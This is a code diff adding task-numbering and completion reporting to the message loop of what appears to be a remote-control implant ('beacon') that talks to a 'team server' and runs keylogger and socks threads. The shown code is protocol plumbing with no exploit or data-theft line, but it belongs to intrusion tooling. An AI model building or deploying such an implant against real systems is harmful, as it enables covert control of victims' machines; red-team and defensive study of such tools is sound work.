@@ -506,18 +506,102 @@ void process_message(unsigned int type, char * buffer, int length) {
 	}
 }
 
+/* ---- task tracking (4.13) ----
+ *
+ * The team server numbers every task it sends and the beacon reports
+ * what became of it: the task's output frames carry its number, and so
+ * does a completion frame once its handler has returned. A handler that
+ * started a job (jobs.cpp) hands the completion to the job. The frame
+ * layout is in commands.h. */
+static void put_be32(char * p, unsigned int v) {
+	v = htonl(v);
+	memcpy(p, &v, 4);
+}
+
+static unsigned int g_task_no;        /* the task whose handler is running, 0 = none */
+static int          g_task_job;       /* it started a job: the job completes it */
+static unsigned int g_job_task_no;   /* psh_poll sets these while a job's output is delivered */
+static unsigned int g_job_id;
+static DWORD        g_main_tid;      /* only the main thread's frames are a task's */
+static int          g_task_depth;    /* nested payload loops (a pivot link reads tasks inside its handler) */
+
+unsigned int task_current_no(void) {
+	return g_task_no;
+}
+
+void task_job_claimed(void) {
+	g_task_job = 1;
+}
+
+void task_job_context(unsigned int task_no, unsigned int job_id) {
+	g_job_task_no = task_no;
+	g_job_id = job_id;
+}
+
+int output_task(task_out * out) {
+	out->task_no = 0;
+	out->job_id = 0;
+	out->has_job = 0;
+	/* a worker thread's frame (a socks or keylogger thread) belongs to
+	 * no task: tagged, it would take whatever task happens to be running */
+	if (g_main_tid == 0 || GetCurrentThreadId() != g_main_tid)
+		return 0;
+	if (g_job_task_no != 0) {
+		out->task_no = g_job_task_no;
+		out->job_id = g_job_id;
+		out->has_job = 1;
+		return 1;
+	}
+	if (g_task_no == 0)
+		return 0;
+	out->task_no = g_task_no;
+	return 1;
+}
+
+void task_notify(unsigned int type, unsigned int task_no, int job_id, const char * data, int length) {
+	char frame[8 + 256];
+	int n = 4;
+
+	if (task_no == 0)
+		return;
+	put_be32(frame, task_no);
+	type |= TASK_TAG;
+	if (job_id >= 0) {
+		put_be32(frame + 4, (unsigned int)job_id);
+		n = 8;
+		type |= JOB_TAG;
+	}
+	if (data != NULL && length > 0) {
+		if (length > 256)
+			length = 256;
+		memcpy(frame + n, data, (size_t)length);
+		n += length;
+	}
+	KD("task: notify type=", (long)(type & 0xFFFF));
+	KD("task: notify no=", (long)task_no);
+	command_shell_post(frame, n, type, FALSE);
+}
+
 /* process through the buffer... extract the length, type, and value */
 void process_payload(char * buffer, unsigned int length) {
 	header h;
 	unsigned int pos = 0;
 
 	while (pos < length) {
+		unsigned char * frame = (unsigned char *)(buffer + pos);
+		char * args;
+		int arglen;
+		unsigned int task_no = 0;
+		unsigned int outer_task;
+		int outer_job;
+		int job_started;
+
 		/* a trailing fragment smaller than a header is corruption (or a
 		 * truncated dump) - never read past the payload */
 		if ((length - pos) < sizeof(header))
 			return;
 
-		memcpy((void *)&h, buffer + pos, sizeof(header));
+		memcpy((void *)&h, frame, sizeof(header));
 
 		/* fix the endian values */
 		h.type = ntohl(h.type);
@@ -530,9 +614,46 @@ void process_payload(char * buffer, unsigned int length) {
 			return;
 		}
 
+		args = (char *)(frame + sizeof(header));
+		arglen = (int)h.size;
+		if (h.type & TASK_TAG) {
+			/* the task number rides in front of the arguments */
+			if (h.size < 4)
+				return;
+			memcpy(&task_no, args, 4);
+			task_no = ntohl(task_no);
+			args += 4;
+			arglen -= 4;
+			h.type &= ~TASK_TAG;
+		}
+
+		/* the task is current for its handler's frames. A handler may run a
+		 * nested payload loop (a pivot link reads its tasks inside its
+		 * handler): the outer task is put back afterwards. */
+		if (g_task_depth == 0)
+			g_main_tid = GetCurrentThreadId();
+		outer_task = g_task_no;
+		outer_job = g_task_job;
+		g_task_depth++;
+		g_task_no = task_no;
+		g_task_job = 0;
+		KD("task: begin no=", (long)task_no);
+
 		/* process our message */
 		//dlog("Process Message: %d t: %d h:%d (nl)", h.size, h.type, sizeof(header));
-		process_message(h.type, buffer + pos + sizeof(header), h.size);
+		process_message(h.type, args, arglen);
+
+		KD("task: done no=", (long)task_no);
+		/* this task's own flag, read before the outer task's state is back */
+		job_started = g_task_job;
+		g_task_depth--;
+		g_task_no = outer_task;
+		g_task_job = outer_job;
+
+		/* the handler returned: the task is completed - unless it started a
+		 * job, which completes it when the job ends (jobs.cpp) */
+		if (task_no != 0 && !job_started)
+			task_notify(CALLBACK_TASK_COMPLETED, task_no, -1, NULL, 0);
 
 		/* on to the next message please */
 		pos += h.size + sizeof(header);
